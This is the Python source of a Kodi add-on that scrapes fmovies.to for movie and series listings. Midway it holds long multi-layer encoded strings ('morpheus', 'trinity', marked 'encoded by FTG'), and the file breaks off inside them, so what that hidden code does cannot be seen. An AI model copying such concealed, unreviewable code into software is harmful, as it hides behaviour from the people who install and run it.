# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES      = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'

exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if fnapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')  

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)  
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),          
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item('https://fmovies.to/filter?type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True)  
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]subtitles:[/COLOR] [B]"+fnapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fnap', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item('https://fmovies.to/filter?type[]=series', 'List tv-series', 'DefaultMovies.png', "listmovies", True)  
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]subtitles:[/COLOR] [B]"+snapn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:snap', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    add_item('https://fmovies.to/movies', 'Movies', 'DefaultMovies.png', "menumov", True)   
    add_item('https://fmovies.to/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  

    xbmcplugin.endOfDirectory(addon_handle)
    

def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    # mud='getLinks'
    fold=True
    # for f in itemz:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)    
    # itemzx=serials
    # items = len(serials)
    # mud='getseasons'
    # fold=True
    # for f in itemzx:
        # add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items)    
    for f in itemz:
        mud = 'getseasons' if '/series/' in f.get('href') else 'getLinks'
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)
    if pagin:
        add_item(name='[COLOR blue]>> Next Page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')   

        xbmcplugin.endOfDirectory(addon_handle)     

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY1MzE3NTUwNmYzMDcxMzYzNTU4NzQ0YzJiN2EzOTczMzY1NDdhNzM2MjcwMzM1NzY5NDk3NjRhNTU3OTZjNGU2YTc4NTE3NTRkNDE1MTZkMzc0ZDU0Njc3NDQ1NDgzOTM0NzE1MzYzNTQ2ZjRmNzg0OTU0NzU2NDU4NDgzNzM5NTc1Mzc2NDk1ODU4MzI1YTZlNzQ0NTM4N2E0NTRmNGE0MjQ5NGI0OTM3MzMzNTVhNmUyYjczMmY2NjZhMzE2NTY5Mzk3NTUwMzQzNDM5NjY1ODM0NWE2NjJmNzY0MTY2NzY3OTM1NTMyZjM1NjMyZjJmNTA0YjQ4NjMzOTMzNjMzMzZhMzkyYjY2NTQ2ZTM4Mzc2NjY3NzcyYjJmNGY3NjU4NDY0ODM4Mzc1YTYzMmYzMTRjNjYzMzM1NzUzMTM0MmYzOTc1NzY2NjJmNmUzMTRlN2E2ZTRkNGM3OTJmMzEzNjZhNTAzMzZlNzk3NjcwNjgzNDM0NjIzMzMwNzI3MDM1NjQ3NDRlNWE3OTdhNjQ3NTQ3NmM2NTM5NzY1MDUwMzQ2ODcxNjY3MzZlNmY3ODM1NmQ2YzZkNTI0ZTJmNmU0NDc5MmYyYjM1NTk3ODcyMmI1NzRhNzQ0YzcwNmQ3NDJmNmY2Mjc2NmQ2ODY1Mzg3YTM2Nzg0YzY3MzIzODJiNTg3NTc5Nzc0ZjJmNmE1MDVhNmE0NzQ5NTIyZjZkMzk3MzQ2NjI3MDM1NmQzMDMxNTY3NjYyNGIzMzY0NzE3MjRlNDI3NDU2NTc2YzY4NzE2YTRkNjY1NjZkNDQ2ZDcyNTY0NjZkNzI2MzZkNzU3MjU3NmM3MTcyNGQ2MTdhNTY0YjQ5N2E2MzZhNTEzMDMxNTY3NTRmNzE2YTRiMzE1Njc2NjU1ODYxNjY2YzU1NzE0OTJiNTAzNjU1Njg3MDVhMmI3NTRlNGU2YTU4NGE2MzU5MzkzMzRiN2E3NzdhNzU3NDJmNGI1NjZjNWE2MzYyNjY0YTM4NWE2MTM5NDMzNTRiNmE0ZTdhNTY2NTYyNmU1NjU2NzA2Nzc2MmIzMjQ5MmY1NTY1NDY1MDU2NjEzMTVhMzYzMzU0Mzc2MjQyNGIzODU3MzE1YTQ3NGI0NDRjNzg0ODRlNmUzNTVhMzY0ZDc0NTY3MzRkNjE2OTc5NDc3MjRkNzc3NjY1NjgzOTMzNjEzNjc4NTM0ZDYxMzc1NDU0NjIzMjc5NTA0Njc1NGU1NzM1NzgyZjQ3NzY0YTUzNDQ2MTc1Nzg3NzUwMzY2NzcxMmI1YTVhNjU2MjMwNjE1OTM5Nzc1ODQ4NTc2OTMxNDY2NTZjNGY3NDM2NDE3NjcyMzE1NzY0NmQ2MzcyNGU1YTZkNzA1NTQyNzIzNzQ0NmQ3MTMyNGE2MzMzNDIyZjMwNzMzOTU4NmYzODQxNTY2MjM4NjM0MzM2Mzk1NjczMzU1NjU5MzQ2MjM5NzU0MjUwNzM2NzRiMmIzOTU1NTMzNTJiNDg2NTZhNTczMTM4NWEzMzUwMmY2YzU2NzU0ZDM0NDI2NjU4NDQ0ZjY1NjM3YTRhNTU2MjM0NmU3YTM4Mzc2MTcyMmI2MTMxMmY0OTcyMzQ0MzYzNGQ3NDRiNTA0YjJiNjg3ODRkMmY0MzQ2NjQ1NzU2NmQ1MTU3Mzc2NzJmMzI1MzcyNDY0ODc2MzQ3MDQyNGQzNjYzNDUyZjUxNTIzMzY4NjU2YTU2NzM3MjU0Mzc2MzdhNmU0NDJiNzU1NTc1NzE2YTY3NzY3ODc4NTQ3YTMyNmI2ODU5NGUzNzQ1MzI2MzRlMzE0MTY2MzI0ZTRlNTg2ZjM0NjI3NjQzNTg3NTMwMzg0ZjMwNzMzMzVhMzU3ODcyNGIzMzY2NGM0ZTVhNDE3YTM1NTE1MzM5NzAzNTczNGM3YTY5NTUyZjJiNDEzNzc5NjQ3OTZiNmUzMjY3NTAzMDU2NmI0ZDZkMzQ0ODM1NTY3ODM1NDI1MDJmNjc1YTM1NTE2YjYxNzE1NzJmNmQ1MTc0Nzc3NTVhNzA3MDQ0N2E3OTQ4NTc2NTQyNTQzMjQyNDQ3NDcwNGU2ZjY1MzA0MzZjNmQ1NDdhNjI0NTU4MzU3MDQyNTgzMTMwMzA0NTJmNGE2ZDU1NDg3NTU5Mzg3MjY2NTEzNzcwMzI2YzRiNzY3NTRhNGE3Njc2NDI3NDU2N2EzMzMyNTY0ZjM5NmM0YzZlNmY0OTU4MzMzNDRlMzg2YzQ1NmQzNzQxNmEzMzU5NTIzMTZlMzQ0NDc1NzU2ZjM3Mzc3OTQzNTg0ODQ1NjUzNzQ4NTQ0ZDY2NzQ2MzY2Mzk3ODJmNDE0ZTM3MzQ3MjJiNzQ1NTQ5NzU3OTc5Njg0NzM5MmI2YTc2NTY1MzY3NDIyZjU5NDc3NTVhNTU2ZTc5NmM1MDU0NmU0Yzc1NTU0NzM2MmY2NzQ3NjI0YTU4NzQ0MzQ4NjY2ZjJmMzc0Zjc1NDg0YTJmMzY0NjRmNDMyZjc3N2E2ZTYyNmQ0NzU4Mzk0YTYzNGI2NDRkNDEyYjc5NTQyZjcwNDg0ZDQ4MzE3NTRkNDYzNjUzNTY3MjY3NDY3ODU2MzA1NDQyMmY0YzcxNDUyYjYzNTYzMTQ4NTg0YTc1NTI3MTU0NTg0YzRhN2E0OTdhMzI0ZjM5NDYzMTc3NTQ3NjczNTM1NDM0NTY2NjYzNTQ2ODc1NzE3YTRkNzk0OTY0NGU3NTczNmIyZjM5NDc3ODZmMzIzMzRiNzgzMzcwNjQ2NjJmNGQ0NTJmNTU3NDZhN2E1MzRjMmY0Mjc2NzY1NTU3NjY3MDY1NTg0YjJiMzI0ODMxNGQ0ZDRhMmY0NzY2NjEzNzY4NTY2ZjcwN2EzNTc4NjIzMjcwMzc0OTU4MzE3NTQxNWE3MzQ1NDgyZjUxNmEyYjY3MmYzODYxNzE1ODM5Nzk0ZDRmMmIzMDQxNjYzMjdhNjQ0ZjM4Nzc2YTRkMzg3MDJmMzg0YTUzMmY3NDM3NmE2NjMwNmY3NDM1NTE3ODQxNTg3YTY4MmIzOTU4MzQyZjRiNjEyYjM0Njc2YzMwNDQ3MjM4Njc3NjM5NDE3MjJmNTM2NTQ2N2E2NDQyNzYzNjVhNjU1NTU3Nzk2ZTM1NmU0ZjY0NTEzMzc1NTE0NDJmNTA3OTU5Mzc0OTdhNjY3NTU0NDg2YjQzMzMzNTM5NTM1ODM3NDE0YzJiNTY1MzRmNDk3NzY2NTc2YzM3NzAzNjU4NjYzNTQ5NzgzNTUxNjY2OTY2NTk0YzJiNTE0ZjJiNjM0NTJiNjI0MjMxMzMzMDY3NGM2ZTYxNzY2ZDU1NGY0MTM5MzY2NzMxMmI2ZTQ1NzY2MjMyMmY0OTVhMzkzNDQ1NjU2NzcwMzY1MzYzNGU2ZTY5NzYyZjUxNjczNjc3NGM2MzZhMmY1NzQ5Mzc1MDU5NjM2NjUxMzIzNDU3Mzc1MTU4NzY3NDU0Mzk0MTJmNmQ2NjcxNmU2MjRhNjg2ZTQ1NDkzODZmNjQzNTY4NmEzOTQyNjg2NTVhNzI3MzQzN2E0NTUxNDY2NzQ4NWE2MTRjMmY3NDQ3NGYzODU5NTI3ODQ1NGM2MTRiNjY1OTQxMzM3YTUyNzIzMDcyNzk2YzdhNDc1NzMwNmEzODUxNjQ3NzcyNDc2ZTQyNmU3NDY5NDgzNDQzNzY3ODM4NWE2ODM4Njc1ODM5NDc1MDcwMmI0YTZlNzE3NTQxNTE1YTUxNjIyYjZjNDIyZjJmNTUzODUxNjI3OTUyNGM3YTdhNzc1YTRkNjI2YjM4MzU1Mjc4MzE1MDQ5NjQzMTU4NDMzNzc1NDgzMzU3NTk3MjdhNDc0YjRlNGI0YzU2NjY1OTQ2NTg2OTc0NGI1MTUwNzczNTM5NDk1ODQ1NDQ2NDY0Mzg2YTQ4NWE1NDU2MzU3MTY2NTUzNzc4NDQzOTM5NmY2NjM5NzgzNTczNDM1MDQ5MzA1NjY2MzA0ZDJiNTE0YTU5NTUzODc4NTY3NTQ1Mzc3OTcxMmI2OTU0Mzk0Njc1NDk1MzJmMzY3MTUyNjkzMTUwMzc2OTRkNGYzOTY3NWEzOTY3NDgzNTU5NDUzMDQ2NzY1NDQzNTc0MzczNjI2ZTZiNjY0YzRiMzk2NjMwNGE2MzZmNDk2NDUxNDUzNjVhMzk2YjU4NDk2ODZlNTI3MjU3NTU0OTc1NGM3NTRkNmYzNDY3NTg2OTM5NTk3MDc4NTUzODc0NGUzNjc3NzYzNjc4NjQyYjQ5MzIzNTQ0NWE0MTRjMmI0MzQ4NTA1MTJiNzU0ZDRhMmI3ODc1NDk3MjcyNzM0ZDJiNTIzOTc3NmE1NDY5NDU2NjU3NWE0ZjY1NmY0NDY2NTg2NzM1MzU2ZjcwMzQ3MDM1NzM1MTU5NjQ2ZjM5NWEzNzc5NmUzMTMwNTQ0ZjQyMzY1YTJmNDk2NjcyNDI3NDcwNmUzNDc5NzI3OTQyNGQzNjc2Njg1ODY3NjgyZjQ1MzQ3NDZlNTE3NTUxNDg3YTU4MmY3MTU4Mzk0NTZlNGE0MjJmNmM0NDMwNmQ3ODMzMzI1MTM5MzU0NjQ4NDc1NDJiNjc3NzM0NTI0NjM1NmE2ZTQ3NDcyYjVhNjgzMzUzNjM1YTY2NzczNzM2NjI3OTQ2NGY0MTQ3MzU1MTQ0MzQzNzYyNTczODRmMmI0YjRlNjU3YTUzNmM2ZTU1NzgzNDY1MmI0MzRiNjY0ZDY2Nzk0ODJmNjc1ODVhMzA3MzJiNTE3Mjc4NDczMzU0NGY1MTcwMzI0ZjJiNmQ1YTRhNzk0NTU4NGM2ZjcwNTQ2YTQ0NjU1YTY0NDE3MjJiNDIzNDZjMzg3ODY2Nzk1NjZkNzg0ZTM5NzE2ZTdhNmQzODMxMzQ2ODYyNjk0ZDJmNGE3NDRlMmI2OTc1NWE3NDM2NjIzODY5N2E3ODYzNjc2ZDM3NjEzOTMyN2E0YjQxMzk2ZjJiMzY0OTJiNTU0OTJiNzk0YjYzNTE1ODMwNjE1MjMzNTI0ZTczNmIyZjM0NmU2MzRhNzYzNDQ4NjY0ZDMwMzk3MDRmNzg2ODY4NmM3YTM3NzQ0MTc2NWE1OTQ5NmYzNDc3NjY3MDU4NTU0ZjJmMzI0OTY0NmI1MTM5MzA0ZDM3Njg2ODM2Njc0NDM0NDgzODM5Mzc1NTRiNmM3MDQyNGYzODc1NjI0MTc2Nzg0MTY2NTU0NjJmNDM2YTcyNjE0NzJmMzgzMzU4NjM0MTQ2MzIzMDY0MzM3YTc2NGQ2YTM1Njc1MDYzMzc1MjY0NTE0ODc5NGI1ODZhNTEyZjcxNTg1ODQ5N2EyZjZiNjI2ZjQ4Mzg3MjQ1NDEzMzM4NmY3NjRjNzY0MTY5MzczOTZkNmI1MDM0NDQyYjU2NmE0ZjQ3NzM0YzJmNDE2MzJmNGM0ZTc1NTk0NTM2NDgyZjUzNzI2MTQ4MmI0YjUzNjc3NDJmNzkyYjVhNzIzNzMxNTIzNzcyNmQ'
trinity = '1LGD2ZmV3ZQWvAmZ1AGp5AQR1BQWvZmDmZGD0AmH2BGMyAzZ0MwZ1ZmV2AwHkAmxmZmMuATD2AwD0AQt3ZGWzAQD0BQEuAzZlMwEuAQt2AwMwAGV1AQZmATZ2ZGZkAGN3AwquATD2MGD3AQx0ZmWzATH3LGH2ZzV1AwplAzH1ZQL2AQZ0AwLkZmN3BGZ5Amp1ZwZ1Awx1ZmZ4AmDmAwZ4Awt2AGH0AmD2AQp3AGH3ZwZlATH0MGIuZmtmAGZ0ATL3AGH1ATZ3BGEuAwL3BQD2ZzL0LwIuZmL2BQD3AQt2AGHlZzVmZQquAGL2BQHjAwp0LmZ5AmR3ZGL5AmZ2AmEuZmx3ZQZkAmx3AwMzAzL1LGMwZmN3AmZ2AGN3BQEzAmLmZwEyZzV0AmIuAzZ2AwD3ATV0MQL4AGtlLwLkAGt2LwLlAGp0Zmp2AwpmAmHkAQZlMwZjAQx2AQL5Amp2MGp2AzZ0LmD3AzV2AQL5AwRmAQMuAJR3Zmp3AzD0LwL0AQVmBGpjZmtmAwMyAwx0LwMzA2R2MGMuAQp2MQD5AmtmZGp0AQt1ZQZ5AGN3ZQEuAGt3ZwDlATZ3BQDlAwD0AwWvAwL3AGExAzDmAwp3AGN0LwH2AwH2AQHmZmN3AmL0AQtmAwD2AmLmZwL3AGt3ZwDmATH2AmHlZmp3ZGH3AmNmAwZ4AQpmZQExAzZ2MQHjAwR3AQWzAGDmBGHlZmZ3LGEzAwL1ZGZ2AmZ3ZmLlAQL0Mwp1AGR2LmZ1ATR0Awp5Amx2BQL2AQxmBQZ2Amt1AQH4ATH2ZGLlAQL2AGp5Awx1BGDlZmD0AGZmZmt3LGHjAmV0Mwp0AwxmAmL0AwZ1LGZ4Awp0LmZlAJR3ZQp4A2R3AQD0ZzVmAwplAQD0MwIuATHlMwL5AwZ2AGL5AmDmZQHjAwR2BQEvAzH1ZGZ5ATH0MGL0AGp2BGMwAzRmAGL2Amt3BQH4AQx0BQplATR1ZmEuAwZmAwD2AQt0AwIuAwL1AwWvAmt2ZwZjAGHmBQMyZzV3ZQMvZmp3AGH1ZzL0ZwLmAmp1LGL0AQVmBGD2AzD1Zwp0ATV3AwZ3AGV0AQp5AmN2AQWzAGRmAmZmAQt1AwExAJR2AwWvAwDmZwEwZmx1LGDmAwp2AQMwZmH2BGZmAwD2AQZjZmL1AGDkZmxmAwquAGplLwWzZzL0MwD4AzRlMwH4Amp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